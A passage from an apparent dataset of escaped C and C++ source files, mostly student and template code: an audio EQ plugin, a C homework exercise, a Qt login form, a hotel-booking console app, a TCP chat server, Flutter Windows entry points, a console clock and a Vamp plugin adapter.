SimpleEQAudioProcessor::releaseResources()\r\n{\r\n    // When playback stops, you can use this as an opportunity to free up any\r\n    // spare memory, etc.\r\n}\r\n\r\n#ifndef JucePlugin_PreferredChannelConfigurations\r\nbool SimpleEQAudioProcessor::isBusesLayoutSupported (const BusesLayout& layouts) const\r\n{\r\n  #if JucePlugin_IsMidiEffect\r\n    juce::ignoreUnused (layouts);\r\n    return true;\r\n  #else\r\n    // This is the place where you check if the layout is supported.\r\n    // In this template code we only support mono or stereo.\r\n    // Some plugin hosts, such as certain GarageBand versions, will only\r\n    // load plugins that support stereo bus layouts.\r\n    if (layouts.getMainOutputChannelSet() != juce::AudioChannelSet::mono()\r\n     && layouts.getMainOutputChannelSet() != juce::AudioChannelSet::stereo())\r\n        return false;\r\n\r\n    // This checks if the input layout matches the output layout\r\n   #if ! JucePlugin_IsSynth\r\n    if (layouts.getMainOutputChannelSet() != layouts.getMainInputChannelSet())\r\n        return false;\r\n   #endif\r\n\r\n    return true;\r\n  #endif\r\n}\r\n#endif\r\n\r\nvoid SimpleEQAudioProcessor::processBlock (juce::AudioBuffer<float>& buffer, juce::MidiBuffer& midiMessages)\r\n{\r\n    juce::ScopedNoDenormals noDenormals;\r\n    auto totalNumInputChannels  = getTotalNumInputChannels();\r\n    auto totalNumOutputChannels = getTotalNumOutputChannels();\r\n\r\n    // In case we have more outputs than inputs, this code clears any output\r\n    // channels that didn't contain input data, (because these aren't\r\n    // guaranteed to be empty - they may contain garbage).\r\n    // This is here to avoid people getting screaming feedback\r\n    // wh",
    "\ufeff//A1_ThaiNguyen_Class1245_66369\n#include <stdio.h>\n#include <math.h>\n#include <ctype.h>\n\n//1.\nint CountL(char word[]);\n//2.\nint sumFunction(int numbers[], int size);\n//3.\ndouble distanceFunction(double x0, double x1, double y0, double y1);\n//4.\nint palindrome(char word[]);\n\n\n\n\nint main()\n{\n\t//test test commit\n\t//1. \n\tchar word[] = \"Hello\";\n\tint count = CountL(word);\n\tprintf(\"1.There are %d letters 'l' in the word\\n\", count);\n\tprintf(\"\\n\");\n\n\t//2.\n\tint numbers[] = { 5,1,4 };\n\tint sizeofArray = sizeof(numbers) / sizeof(numbers[0]);\n\tint total = sumFunction(numbers, sizeofArray);\n\n\tprintf(\"2.The sum of the integer array is %d \\n\", total);\n\tprintf(\"\\n\");\n\n\n\n\t//3.\n\tint x0 = 1, y0 = 1;\n\tint x1 = 5, y1 = 4;\n\tdouble distance = distanceFunction(x0, x1, y0, y1);\n\tprintf(\"3.The distance between two points is: %4.2f \\n\", distance);\n\tprintf(\"\\n\");\n\n\n\n\t//4\n\tchar word1[] = \"civic\";\n\tchar word2[] = \"Hannah\";\n\tchar word3[] = \"radar\";\n\n\tprintf(\"4. \\n\");\n\tprintf(\"%s is a palindrome: %d (1 is yes, 0 is no) \\n\", word1, palindrome(word1));\n\tprintf(\"%s is a palindrome: %d (1 is yes, 0 is no) \\n\", word2, palindrome(word2));\n\tprintf(\"%s is a palindrome: %d (1 is yes, 0 is no) \\n\", word3, palindrome(word3));\n\tprintf(\"\\n\");\n\tprintf(\"\\n\");\n\n\n\n\n\t/*5. If you work the following hours, use a switch statement to display the hours worked in a given day.\n\t\tMonday to Friday: 8 hours\n\t\tSaturday: 6 hours\n\t\tSunday: off\n\t*/\n\n\t// 'M' for Monday, 'T' for Tuesday, 'W' for Wednesday, 'R' for Thursday, 'F' for Friday, \n\t// 'S' for Saturday, 'U' for Sunday\n\tchar day = 'W';\n\tprintf(\"5. \\n\");\n\n\tswitch (day) {\n\tcase 'M':\n\tcase 'T':\n\tcase 'W':\n\tcase 'R':\n\tcase 'F':\n\t\tprintf(\"You worked 8 hours.\\n\");\n\t\tbreak;\n\tcase 'S':\n\t\tprintf(\"You worked 6 hours.\\n\");\n\t\tbreak;\n\tcase 'U':\n\t\tprintf(\"You have the day off.\\n\");\n\t\tbreak;\n\tdefault:\n\t\tprintf(\"Invalid day entered.\\n\");\n\t}\n\n\tprintf(\"\\n\");\n\tprintf(\"\\n\");\n\n\n\n\n\n\t/*6. Ask the user to enter a positive integer and display it. Continue this until the user enters a zero or a\n\t\tnegative number.\n\t\tHint: use a while loop. There is no Boolean type in C, so use 1 as true and 0 as false.\n\t*/\n\tint userInput;\n\tprintf(\"6. \\n\");\n\n\twhile (1)\n\t{\n\t\tprintf(\"Enter a positive number (press 0 or negative number to stop) : \");\n\t\tscanf_s(\"%d\", &userInput);\n\t\tif (userInput > 0)\n\t\t{\n\t\t\tprintf(\"You entered: %d\\n\", userInput);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tprintf(\"Program stopped \\n\");\n\n\treturn 0;\n}\n\n\n//FUNCTION PART\n\n//1. Write a function to count the number of the letter \u2018l\u2019 in the word \u201cHello\u201d.\nint CountL(char word[])\n{\n\tint count = 0;\n\tfor (int i = 0; word[i] != '\\0'; i++)  //loop the word until it reach the stop sign\n\t{\n\t\tif (word[i] == 'l')\n\t\t{\n\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n\n}\n\n\n//2. Write a function to find the sum of the integer array of 5, 1, 4\nint sumFunction(int numbers[], int size)\n{\n\tint sum = 0;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tsum += numbers[i];\n\t}\n\treturn sum;\n}\n\n\n/*3. Write a function to find the distance between two points. Each point is characterized by an x and a y\n\tas follows.\n\tPoint 0: x0 = 1, y0 = 1\n\tPoint 1: x1 = 5, y1 = 4\n\tDistance = \u221a( (x1\u2212x0)^2 +(y1 \u2212 y0)^2 )\n\tHint: include stdlib.h in your file and from it use functions sqrt() and pow().\n*/\ndouble distanceFunction(double x0, double x1, double y0, double y1)\n{\n\tdouble distance = sqrt(pow(x1 - x0, 2) + pow(y1 - y0, 2));\n\treturn distance;\n}\n\n\n\n/*4. Write a function to determine if a word is a palindrome. A palindrome is a word that reads the same\n\tfrom right and from left. For example civic, Hannah, and radar.\n*/\nint palindrome(char word[])\n{\n\tint length = 0;\n\twhile (word[length] != '\\0')  //same loop as in question 1 but while loop instead of for\n\t{\n\t\tlength++;\n\t}\n\n\tfor (int i = 0; i <= length / 2; i++)\t\t\t//loop till the middle only\n\t{\n\t\tif (tolower(word[i]) != tolower(word[length - 1 - i])) { \t//I looked for this tolower() function of <ctype.h> library on Google, earlier I only do (word[i] != word[length -1 -i])\n\t\t\treturn 0;\n\t\t}\n\t}\n\treturn 1;\n\n}\n\n\n\n\n\n\n\n",
    "#include \"mainwindow.h\"\n#include \"./ui_mainwindow.h\"\n#include <QApplication>\n#include <QWidget>\n#include <QPushButton>\n#include <QMessageBox>\n#include <QLineEdit>\n#include <QLabel>\n#include <QVBoxLayout>\n#include <QHBoxLayout>\n#include <QListWidget>\n#include <QDialog>\n#include <limits>\n#include <unordered_map>\n#include <QTextStream>\n#include <QFile>\n#include <QTextStream>\n#include <QDir>\n#include <QMessageBox>\n#include <QtSql/QSql>\n#include <unordered_map>\n#include <QSqlDatabase>\n#include <QSqlQuery>\n#include <QSqlError>\n#include <QTextEdit>\n#include<QPixmap>\n#include \"register_dialog.h\"\n#include \"game_or_history.h\"\n#include \"ui_game_or_history.h\"\n\n#include \"GameManager.h\"\n\n\n\n\n\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    db = QSqlDatabase::database();\n\n}\n\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\nUi::MainWindow* MainWindow::getUi() const {\n    return ui; // Return the private UI member\n}\nQString username1,password1;\n\n\n\n\n\nvoid MainWindow::on_userName_textChanged(const QString &arg1)\n{\n    username1 =arg1;\n}\n\n\nvoid MainWindow::on_PassWord_textChanged(const QString &arg1)\n{\n    password1 =arg1;\n}\n\n\nvoid MainWindow::on_Register_clicked()\n{\n    register_Dialog register_dialog;\n    register_dialog.setModal(true);\n    register_dialog.exec();\n}\nvoid MainWindow::someFunctionToShowDialog()\n{\n    register_Dialog dialog(this);\n    dialog.setModal(true);\n    dialog.exec();\n}\n\nvoid MainWindow::on_Login_clicked()\n{\n    if (!username1.endsWith(\"@gmail.com\")) {\n        QMessageBox::critical(this, \"Error\", \"Username must end with @gmail.com\");\n        return;\n    }\n    if (password1.length() != 6) {\n        QMessageBox::critical(this, \"Error\", \"Password must be 6 characters long\");\n        return;\n    }\n\n    QSqlQuery query(db);\n    query.prepare(\"SELECT * FROM Users WHERE username = :username AND password = :password\");\n    query.bindValue(\":username\", username1);\n    query.bindValue(\":password\", password1);\n\n    if (!query.exec()) {\n        QMessageBox::critical(this, \"Database Error\", \"Failed to execute login query\");\n        qDebug() << \"Query error:\" << query.lastError().text();\n        return;\n    }\n\n    if (query.next()) {\n        // Successful login\n        QMessageBox::information(this, \"Success\", \"Login successful!\");\n\n        gameManager.loggedInUsername = username1; // Capture the logged-in username\n\n        QString history = query.value(2).toString(); // Assuming history is in column 2\n        gameManager.loggedInhistory = history; // Update logged-in user's history in gameManager\n        //QStringList historyItems = history.split(\",\");\n\n        // history = \"Updated history\"; // Example: Replace with actual history update logic\n        gameManager.totalhistory << history;\n        //emit gameManager.historyUpdated(gameManager.totalhistory);\n\n\n\n        // Update history in the database\n        QSqlQuery updateQuery(db);\n        updateQuery.prepare(\"UPDATE Users SET history = :history WHERE username = :username\");\n        updateQuery.bindValue(\":history\", gameManager.loggedInhistory); // Update with the actual history\n        updateQuery.bindValue(\":username\", username1);\n\n        if (!updateQuery.exec()) {\n            QMessageBox::critical(this, \"Database Error\", \"Failed to update user's history\");\n            qDebug() << \"Update query error:\" << updateQuery.lastError().text();\n            return;\n        }\n\n        qDebug() << \"User's history updated successfully\";\n        // Display the game or history dialog\n        game_or_history game_or_history;\n        game_or_history.setModal(true);\n        game_or_history.exec();\n    } else {\n        // Failed login\n        QMessageBox::critical(this, \"Error\", \"Invalid username or password\");\n    }\n}\n",
    "#include<iostream>\n#include<fstream>\n#include <string>\n#include <cstdlib>\n#include <ctime>\nusing namespace std;\n\nclass temp{\n    string name,email,date_of_saty,arival_time,roompref;\n    long int contact_number;\n    int c_id;\n    string searchname,searchemail;\n    int searchc_id;\n    fstream file;\n    public:\n    void book_room();\n    void details_room();\n}obj;\n\nint main()\n{\n    char choice;\n    while(true){\n    cout<<\"\\n1-Book Rooms\";\n    cout<<\"\\n2-Details of Booking\";\n    cout<<\"\\n3-exit\";\n    cout<<\"\\n Enter your choice ::\";\n    cin>>choice;\n\n    switch(choice){\n        case '1':\n        cin.ignore(); //skip character in the input buffer\n        obj.book_room();\n        break;\n        case '2':\n        cin.ignore();\n        obj.details_room();\n        break;\n        case '3':\n        return 0;\n        break;\n        default:\n        cout<<\"Invalid selection........\";\n    }\n}\n}\nvoid temp :: book_room(){\n    cout<<\"Enter your Name ::\";\n    getline(cin,name);//to take input with space\n    cout<<\"Enter your Mobile Number ::\";\n    cin>>contact_number;\n    cin.ignore();\n    cout<<\"Enter Your Email address ::\";\n    getline(cin,email);\n    cout<<\"Date of stay(format:12May2024) ::\";\n    getline(cin,date_of_saty);\n    cout<<\"Time of arival(format:12pm) ::\";\n    getline(cin,arival_time);\n\n    char roomp;\n    cout<<\"----Room Preference----\";\n    cout<<\"\\n1-Standard Room\";\n    cout<<\"\\n2-Delux Room\";\n    cout<<\"\\n3-Suite\";\n    cout<<\"\\n4-Family Room\";\n    cout<<\"\\n5-Connecting Rooms\";\n    cout<<\"\\n ENTER YOUR CHOICE ::\";\n    cin>>roomp;\n\n    switch(roomp){\n        case '1':\n        roompref=\"Standard Room\";\n        break;\n        case '2':\n        roompref=\"Delux Room\";\n        break;\n        case '3':\n        roompref=\"Suite\";\n        break;\n        case '4':\n        roompref=\"Family Room\";\n        break;\n        case '5':\n        roompref=\"Connecting Rooms\";\n        break;\n        default:\n        cout<<\"Invalid selection........\";\n        return;\n    }\n\n\n    srand(static_cast<unsigned int>(time(0)));\n    c_id = 10000 + rand() % 90000;\n    cout << \"Your customer ID is :: \" << c_id << endl;\n\n    file.open(\"HotelData.txt\",ios :: out | ios :: app);\n    file<<name<<\"*\"<<contact_number<<\"*\"<<email<<\"*\"<<date_of_saty<<\"*\"<<arival_time<<\"*\"<<c_id<<\"*\"<<roompref<<endl;\n    file.close();\n}\n\nvoid temp::details_room() {\n    cout << \"-----DETAILS-----\";\n    cout << \"\\nEnter Name ::\";\n    getline(cin, searchname);\n    cout << \"Enter your Email ::\";\n    getline(cin, searchemail);\n    cout << \"Enter customer ID ::\";\n    cin >> searchc_id;\n    cin.ignore(); // skip character in the input buffer\n\n    file.open(\"HotelData.txt\", ios::in);\n    if (!file.is_open()) {\n        cout << \"Unable to open file for reading.\" << endl;\n        return;\n    }\n\n    bool found = false;\n    while (file) {\n        getline(file, name, '*');\n        file >> contact_number;\n        file.ignore(); // skip the '*' character1\n        getline(file, email, '*');\n        getline(file, date_of_saty, '*');\n        getline(file, arival_time, '*');\n        file >> c_id;\n        file.ignore(); // skip the '*' character\n        getline(file, roompref);\n\n        if (file && name == searchname && email == searchemail && c_id == searchc_id) {\n            cout<<\"\\n\\n--------Customer Details--------\"<<endl;\n            cout<<\"Customer name ::\"<<name<<endl;\n            cout<<\"Contact Number ::\"<<contact_number<<endl;\n            cout<<\"customer Email ::\"<<email<<endl;\n            cout<<\"Customer ID ::\"<<c_id<<endl;\n            cout<<\"Date of Stay ::\"<<date_of_saty<<endl;\n            cout<<\"Time of Arival ::\"<<arival_time<<endl;\n            cout<<\"Room prefered ::\"<<roompref<<endl;\n            found = true;\n            break;\n        }\n    }\n\n    if (!found) {\n        cout << \"Invalid details.......\" << endl;\n    }\n\n    file.close();\n}\n\n",
    "/*?????????????????????????????????????????????????????*/\n\n#include <iostream>\nusing namespace std;\n\nclass vector\n{\npublic:\n    int *arr; // ek integer pointer\n    int size;\n    vector(int m)\n    {\n        size = m;            // size ko set kar do 'm' saiii\n        arr = new int[size]; // arr ko barabar kar do new int[size]\n    }\n    //?????? cant understand   \"T dotProduct(vector &v)\" this line\n    int dotProduct(vector &v)\n    {\n        int d = 0;\n        for (int i = 0; i < size; i++)\n        {\n            d += this->arr[i] * v.arr[i]; // multiply this ka arr[i] with v.arr[i]\n        }\n        return d;\n    }\n};\n\nint main()\n{\n    vector v1(3); // vector 1\n    v1.arr[0] = 4;\n    v1.arr[1] = 3; // number in integer\n    v1.arr[2] = 1;\n    vector v2(3); // vector 2\n    v2.arr[0] = 1;\n    v2.arr[1] = 0;\n    v2.arr[2] = 1;\n    int a = v1.dotProduct(v2);\n    cout << a << endl;\n    return 0;\n}\n\n\n\n/*    examle of class templete with a program    */\n\n\n// #include <iostream>\n// using namespace std;\n\n// template <class T>\n// class vector\n// {\n//     public:\n//         T *arr;                    //jaha jha mera custom data type karna hai uha uha mai T lik dunga\n//         int size;\n//         vector(int m)\n//         {\n//             size = m;\n//             arr = new T[size];     //jaha jha mera custom data type karna hai uha uha mai T likh dunga\n//         }\n//   //?????? cant understand   \"T dotProduct(vector &v)\" this line\n//     T dotProduct(vector &v){       //jaha jha mera custom data type karna hai uha uha mai T likh dunga\n//         T d=0;                     //jaha jha mera custom data type karna hai uha uha mai T likh dunga\n//         for (int i = 0; i < size; i++)\n//         {\n//             d+=this->arr[i] * v.arr[i];\n//         }\n//         return d;\n//     }\n// };\n\n// int main()\n// {\n//     vector<float> v1(3); //vector 1 with a float data type\n//     v1.arr[0] = 1.4;\n//     v1.arr[1] = 3.3;    //number in float\n//     v1.arr[2] = 0.1;\n//     vector<float> v2(3); //vector 2 with a float data type\n//     v2.arr[0]=0.1;\n//     v2.arr[1]=1.90;\n//     v2.arr[2]=4.1;\n//     float a = v1.dotProduct(v2);\n//     cout<<a<<endl;\n//     return 0;\n// }\n",
    "/*\n2) Derived Types : \nArray Types : T[] array of type T\nPointer Types : T* pointer to type T\nRefrence Types : T& refrence to type T\nfunctions : T functionName()\n*/\n\n#include<iostream>\nusing namespace std;\n\n//Function Types\nint sumTwo(int a, int b)\n{\n    return a+b;\n}\n\nint main(){\n    //Array Types - A collection of elements of the same type\n    cout<<\"Arrays\"<<endl;\n    int numbers[5] = {1,2,3,4,5};\n    char name[] = \"UtkarshKT\";\n    char initials[3] = {'U','K','T'};\n    cout<<\"int array : \"<<numbers[0]<<endl;\n    cout<<\"int array : \"<<numbers<<endl;//dispalys complete array - numbers\n    /*\n    we are effectively passing the address of the first element (&numbers[0]) to cout. \n    Therefore, cout interprets it as a pointer to an integer (int*) and prints the memory address (in hexadecimal format) where the array starts.\n    so it displays : int array : 0x16bbc6de0\n    */\n    cout<<\"int array : \";\n    for(int i=0; i<5; i++)\n    {\n        cout<<numbers[i]<<\" \";\n    }\n    cout<<endl;\n    cout<<\"char array : \"<<name<<endl;//dispalys complete array - name\n    /*\n    it assumes that it is dealing with a null-terminated string (C-style string). \n    It then prints characters from the starting memory address (&name[0]) until it encounters the null character ('\\0'). \n    This behavior is specific to C-style strings and does not apply to arrays of other types like int[].\n    so it displays - char array : UtkarshKT\n    */\n    cout<<\"char array : \"<<initials<<endl;//dispalys complete array - initials\n    cout<<\"char array : \";\n    for(auto i: initials)\n    {\n        cout<<i<<\" \";\n    }\n    cout<<endl;\n    cout<<endl;\n\n    //Pointer Types - Holds the memory address of another variable ( signpost or a note that tells you where something is located rather than the thing itself)\n    cout<<\"Pointers Types\"<<endl;\n    int age = 21;\n    int* ptr = &age;\n    char* strPtr = \"Hello\";\n    string str = \"Hello\";\n    string* sptr = &str;\n    cout << \"ptr: \" << *ptr <<endl;\n    cout << \"address of ptr - \"<< ptr <<endl;\n    cout << \"strPtr: \" << strPtr <<endl;\n    cout <<\"address of strPtr: \"<< strPtr <<endl;\n    /*\n    Does not displays address of strPtr\n    In char it points to a sequence of characters in memory, typically representing a C-style string (null-terminated sequence of characters)\n    Where as in int can display the address of the pointer itself using just the pointer variable name (e.g., ptr) because ptr holds the memory address where the int variable resides. This is because the size and type of int are well-defined in C++ and are usually a fixed size (typically 4 bytes on most systems).\n    To display address of char it is done by casting the pointer to const void*, which is the appropriate type for displaying memory addresses with std::cout.\n    */\n    cout << \"address of strPtr: \"<<  static_cast<const void*>(&strPtr) << endl;\n    cout<<str<<endl;\n    cout<<\"address of sptr: \"<<sptr<<endl;\n    cout<<endl;\n\n    //Refrence Types - An alias for another variable (another name for an already existing variable / giving a variable a nickname that you can use interchangeably with its original name)\n    cout<<\"Refrence Types\"<<endl;\n    int& ref = age;\n    cout<<\"ref : \"<<ref<<endl;\n    cout<<endl;\n\n    //Function Types - A block of code that performs a specific task\n    cout<<\"Function Types\"<<endl;\n    int a = 3;\n    int b = 6;\n    cout<<\"function sumTwo() : \"<<sumTwo(a,b)<<endl;\n    cout<<endl;\n\n    return 0;\n}",
    "/*\nAuthor: Abby McCollam\nClass: ECE4122 Section A\nLast Date Modified: 11/26/23\nDescription: Server prompting user for commands to execute\n*/\n\n//headers\n#include <SFML/Network.hpp>\n#include <iostream>\n#include <string>\n#include <sstream>\n#include <cstring>\n#include <omp.h>\n#include <algorithm>\n#include <list>\n#include <cstdlib>\n\nusing namespace std;\n\n//creating instances of classes\nlist<sf::TcpSocket*> clients;\nsf::SocketSelector selector;\nsf::TcpListener listener;\nsf::Packet exitPacket;\nsf::Packet packet;\nsf::Packet packet77;\nsf::Packet packet201;\n\nstruct tcpMessage //Data using following packet structure\n{\n    unsigned char nVersion;\n    unsigned char nType;\n    unsigned short nMsgLen;\n    char chMsg[1000];\n};\n\n//initializing message structure\ntcpMessage lastMessageReceived = { 102, 77, 1, ' '};\nstring command;\n\n//acquiring and printing connected clients list\nvoid printConnectedClients()\n{\n    cout << \"Number of Clients: \" << clients.size() << endl;\n    for (list<sf::TcpSocket*>::iterator it = clients.begin(); it != clients.end(); ++it)\n    {\n        sf::TcpSocket& client = **it;\n        cout << \"IP Address : \" << client.getRemoteAddress() << \" | Port : \" << client.getRemotePort() << endl;\n    }\n}\n\nvoid timeToExit() //exit function when q pressed\n{\n    lastMessageReceived.chMsg[0] = 'q';\n    lastMessageReceived.nVersion = 1; //setting nVersion to 1 and it is read by client\n    exitPacket << lastMessageReceived.nVersion << lastMessageReceived.nType << lastMessageReceived.nMsgLen << lastMessageReceived.chMsg; //exit packet\n    for (list<sf::TcpSocket*>::iterator it = clients.begin(); it != clients.end(); ++it) //sending exit message to clients\n    {\n        sf::TcpSocket& client = **it;\n        if (client.send(exitPacket) != sf::Socket::Done)\n            continue;\n        client.disconnect();\n    }\n    cout << \"Goodbye.\" << endl;\n    exit(0);\n}\n\nvoid readyForClient() //function for accepting new client connections\n{\n    sf::TcpSocket* socket = new sf::TcpSocket;\n    if (listener.accept(*socket) != sf::Socket::Done)\n    {\n        cout << \"Error\" << endl;\n        delete socket;\n    }\n    clients.push_back(socket);\n    selector.add(*socket);\n}\n\nvoid processType201() //function for when version 201 chosen\n{\n    reverse(lastMessageReceived.chMsg, lastMessageReceived.chMsg + strlen(lastMessageReceived.chMsg)); //reverse order\n    packet201 << lastMessageReceived.nVersion << lastMessageReceived.nType << lastMessageReceived.nMsgLen << lastMessageReceived.chMsg;\n}\n\nvoid processType77(const tcpMessage& message, sf::TcpSocket& client, const list<sf::TcpSocket*>& clientTemp) //function for when version 77 chosen\n{\n    packet77 << message.nVersion << message.nType << message.nMsgLen << message.chMsg;\n\n    for (const auto& otherClient : clientTemp)\n    {\n        sf::TcpSocket& other = *otherClient;\n        if (other.getRemotePort() != client.getRemotePort())\n        {\n            bool cont = true;\n            while (cont)\n            {\n                if (other.send(packet) != sf::Socket::Done)\n                {\n                    continue;\n                }\n                cont = false;\n            }\n        }\n    }\n}\n\nint main(int argc, char* argv[])\n{\n    if (argc != 2) //checking for proper number of input arguments\n    {\n        cout << \"Usage: ./ServerTCP <port>\" << endl;\n        return 1;\n    }\n\n    unsigned short port = static_cast<unsigned short>(stoi(argv[1]));\n\n    if (listener.listen(port) != sf::Socket::Done) //start listening to incoming connections\n    {\n        return 0;\n    }\n\n    //BEGIN OPEN MP\n#pragma omp parallel sections\n    {\n#pragma omp section\n        {\n            while (true)\n            {\n                readyForClient(); //accepting clients\n            }\n        }\n#pragma omp section\n        {\n            while (true)\n            {\n                cout << \"Please enter command: \";\n                cin >> command;\n\n                //all options for server commands\n                if (command == \"msg\")\n                    cout << \"Last Message: \" << lastMessageReceived.chMsg << endl;\n                else if (command == \"clients\")\n                {\n                    printConnectedClients();\n                }\n                else if (command == \"exit\")\n                {\n                    timeToExit();\n                }\n                else //error checking\n                {\n                    cout << \"Please enter valid input.\" << endl;\n                    cin.clear();\n                    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n                }\n            }\n        }\n#pragma omp section\n        {\n            while (true) //continuously handling events from connected clients\n            {\n                if (selector.wait(sf::milliseconds(10.f))) // waits for events on selector\n                {\n                    for (list<sf::TcpSocket*>::iterator it = clients.begin(); it != clients.end(); ++it) //iterating over all clients\n                    {\n                        sf::Tc",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"shopinglist_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <windows.h>\n\nusing namespace std;\nclass time\n{\n\nprivate:\n    int hour,minute,second;\npublic:\n    time ()\n    {\n        hour=12;\n        minute=0;\n        second=0;\n    }\n    time(int hour,int minute,int second)\n    {\n        this->hour=hour;\n        this->minute=minute;\n        this->second=second;\n    }\n    int incrementhr()\n    {\n        if(hour>=23)\n        {\n            hour=0;\n        }\n        else\n        {\n            hour++;\n        }\n\n    }\n    int incrementmin()\n    {\n        if(minute>=59)\n        {\n            minute=0;\n            incrementhr();\n        }\n        else\n        {\n            minute++;\n        }\n\n    }\n    int incrementsec()\n    {\n        if(second>=59)\n        {\n            second=0;\n            incrementmin();\n        }\n        else\n        {\n            second++;\n        }\n\n    }\n    void print()const\n    {\n        if(hour>9)\n        {\n            cout<<hour<<\" : \";\n        }\n        else\n        {\n            cout<<\"0\"<<hour<<\" : \";\n        }\n        if(minute>9)\n        {\n            cout<<minute<<\" : \";\n        }\n        else\n        {\n            cout<<\"0\"<<minute<<\" : \";\n        }\n        if(second>9)\n        {\n            cout<<second<<\" : \";\n        }\n        else\n        {\n            cout<<\"0\"<<second<<\" : \";\n        }\n        cout<<\"  \";\n        if(hour>=0&&hour<=11)\n        {\n            cout<<\"AM\";\n        }\n        else\n        {\n            cout<<\"PM\";\n        }\n    }\n\n};\n\nint main()\n{\n    cout<< \"put hour : \";\n    int hr ;\n    cin>>hr;\n    cout<<\"put minute : \";\n    int minn;\n    cin>>minn;\n    cout<<\"put second : \";\n    int sec;\n    cin>>sec;\n    system(\"cls\");\n    time t(hr,minn,sec);\n    while(true)\n    {\n        system(\"cls\");\n        t.incrementsec();\n        t.print();\n        Sleep(950);\n    }\n\n\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"portaler\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n    CHP\n    Copyright (c) 2014 Queen Mary, University of London\n\n    Permission is hereby granted, free of charge, to any person\n    obtaining a copy of this software and associated documentation\n    files (the \"Software\"), to deal in the Software without\n    restriction, including without limitation the rights to use, copy,\n    modify, merge, publish, distribute, sublicense, and/or sell copies\n    of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be\n    included in all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n    MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY\n    CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\n    CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n    WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\n#include <vamp/vamp.h>\n#include <vamp-sdk/PluginAdapter.h>\n\n#include \"ConstrainedHarmonicPeak.h\"\n\nstatic Vamp::PluginAdapter<ConstrainedHarmonicPeak> chpAdapter;\n\nconst VampPluginDescriptor *\nvampGetPluginDescriptor(unsigned int version, unsigned int index)\n{\n    if (version < 1) return 0;\n\n    switch (index) {\n    case  0: return chpAdapter.getDescriptor();\n    default: return 0;\n    }\n}\n\n\n",
